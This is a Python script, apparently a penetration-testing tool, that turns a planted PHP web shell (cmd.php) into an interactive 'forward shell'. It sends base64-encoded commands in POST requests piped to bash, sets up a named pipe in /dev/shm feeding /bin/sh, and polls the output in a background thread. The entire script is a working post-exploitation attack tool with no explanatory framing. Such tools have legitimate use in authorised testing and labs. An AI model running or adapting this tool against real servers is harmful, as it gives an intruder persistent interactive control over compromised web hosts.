#!/bin/python3

import requests, threading, signal, time, sys
from random import randrange
from base64 import b64encode


def handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    run_cmd(erase_stdin)
    run_cmd(erase_stdout)
    sys.exit(1)


signal.signal(signal.SIGINT, handler)

main_url = "http://localhost/cmd.php"
session = randrange(1000, 9999)
stdin = "/dev/shm/%s.input" % session
stdout = "/dev/shm/%s.output" % session
erase_stdin = "/bin/rm %s" % stdin
erase_stdout = "/bin/rm %s" % stdout


class all_the_reads(object):
    def __init__(self, interval=1):
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()

    def run(self):
        clear_output = "echo '' > %s" % stdout
        read_output = "/bin/cat %s" % stdout

        while True:
            output = run_cmd(read_output)
            if output:
                run_cmd(clear_output)
                print(output)

            time.sleep(self.interval)


def run_cmd(cmd):
    cmd = cmd.encode()
    cmd = b64encode(cmd).decode()

    post_data = {"cmd": "echo %s | base64 -d | bash" % cmd}

    r = (requests.post(main_url, data=post_data, timeout=5).text).strip()

    return r


def setup_shell():
    named_pipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (
        stdin,
        stdin,
        stdout,
    )

    try:
        run_cmd(named_pipes)
    except:
        None

    return None


def write_cmd(cmd):
    cmd = cmd.encode()
    cmd = b64encode(cmd).decode()

    post_data = {"cmd": "echo %s | base64 -d > %s" % (cmd, stdin)}

    r = (requests.post(main_url, data=post_data, timeout=5).text).strip()


def read_cmd():
    read_output = "/bin/cat %s" % stdout
    output = run_cmd(read_output)
    return output


if __name__ == "__main__":
    setup_shell()
    read_all_threads = all_the_reads()
    while True:
        command = input("> ")
        write_cmd(command + "\n")
